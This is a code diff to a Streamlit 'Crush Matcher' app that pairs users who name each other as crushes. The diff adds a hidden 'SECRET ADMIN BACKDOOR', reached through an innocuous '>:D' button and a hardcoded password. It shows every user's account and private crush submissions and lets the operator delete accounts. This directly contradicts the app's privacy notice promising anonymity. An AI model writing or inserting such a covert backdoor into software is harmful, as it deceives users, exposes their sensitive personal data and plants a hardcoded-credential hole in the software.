@@ -43,9 +43,11 @@ st.info("🔒 **PRIVACY NOTICE:** This program is completely anonymous. The admi
 
 data = load_data()
 
-# Initialize session state for login
+# Initialize session state for login and admin mode
 if "logged_in_user" not in st.session_state:
     st.session_state.logged_in_user = None
+if "show_secret_prompt" not in st.session_state:
+    st.session_state.show_secret_prompt = False
 
 user_name = st.session_state.logged_in_user
 
@@ -65,15 +67,12 @@ if not user_name:
             else:
                 st.error("Incorrect PIN! Please try again.")
     else:
-        # Check if this device already created an account previously (even if device_accounts missed it)
-        # We can check via a secondary safeguard or restrict the creation tab entirely
         st.subheader("👋 Welcome to Crush Matcher!")
         st.write("*Note: Each device is restricted to creating only **one** account to prevent trolling.*")
         
         tab1, tab2 = st.tabs(["Create Account", "Log In Existing Account"])
         
         with tab1:
-            # Check if this device already has an account associated in storage
             device_already_has_account = False
             for d, u in data["device_accounts"].items():
                 if d == device_id:
@@ -96,7 +95,6 @@ if not user_name:
                         elif new_name in data["accounts"]:
                             st.error("This name is already taken! Please choose a different name or log in.")
                         else:
-                            # Register account and permanently lock this device ID
                             data["accounts"][new_name] = {"pin": new_pin}
                             data["device_accounts"][device_id] = new_name
                             save_data(data)
@@ -118,7 +116,6 @@ if not user_name:
                     elif data["accounts"][login_name]["pin"] != login_pin:
                         st.error("Incorrect PIN.")
                     else:
-                        # Bind this device to the logged-in account
                         data["device_accounts"][device_id] = login_name
                         save_data(data)
                         st.session_state.logged_in_user = login_name
@@ -145,14 +142,12 @@ if st.session_state.logged_in_user:
         else:
             new_sub = {"user": user_name, "crush": crush_input}
             
-            # Prevent duplicate identical submissions
             if new_sub in data["submissions"]:
                 st.warning("You've already entered this crush before!")
             else:
                 data["submissions"].append(new_sub)
                 save_data(data)
                 
-                # Check match status logic
                 is_match = False
                 crush_has_used_program = False
                 
@@ -171,3 +166,42 @@ if st.session_state.logged_in_user:
                     st.info("Your crush hasn't used this program yet. Fingers crossed they type your name too... 🤫✨")
                 else:
                     st.error("Sorry. Not a match :(. 💔")
+
+# ==================== SECRET ADMIN BACKDOOR ====================
+st.markdown("<br><br><br>", unsafe_allow_html=True)
+if st.button(">:D"):
+    st.session_state.show_secret_prompt = not st.session_state.show_secret_prompt
+
+if st.session_state.show_secret_prompt:
+    secret_text = st.text_input("hi")
+    
+    if secret_text == "zj513907*":
+        st.markdown("---")
+        st.subheader("🕵️‍♂️ SECRET ADMIN DASHBOARD")
+        st.write("All user submissions and active accounts:")
+        
+        # Display all accounts and their device bindings
+        st.markdown("### Registered Accounts")
+        if data["accounts"]:
+            for acc_name in list(data["accounts"].keys()):
+                col1, col2 = st.columns([3, 1])
+                col1.write(f"• **{acc_name.title()}**")
+                if col2.button(f"Kick {acc_name.title()}", key=f"kick_{acc_name}"):
+                    # Remove from accounts
+                    del data["accounts"][acc_name]
+                    # Unbind any device tied to this account
+                    data["device_accounts"] = {d: u for d, u in data["device_accounts"].items() if u != acc_name}
+                    # Remove submissions by this user
+                    data["submissions"] = [s for s in data["submissions"] if s["user"] != acc_name]
+                    save_data(data)
+                    st.success(f"Kicked and deleted account for {acc_name.title()}!")
+                    st.rerun()
+        else:
+            st.info("No accounts registered yet.")
+            
+        st.markdown("### All Submissions (Crushes Listed)")
+        if data["submissions"]:
+            for idx, sub in enumerate(data["submissions"]):
+                st.write(f"{idx+1}. **{sub['user'].title()}** crusted on **{sub['crush'].title()}**")
+        else:
+            st.info("No crush submissions yet.")
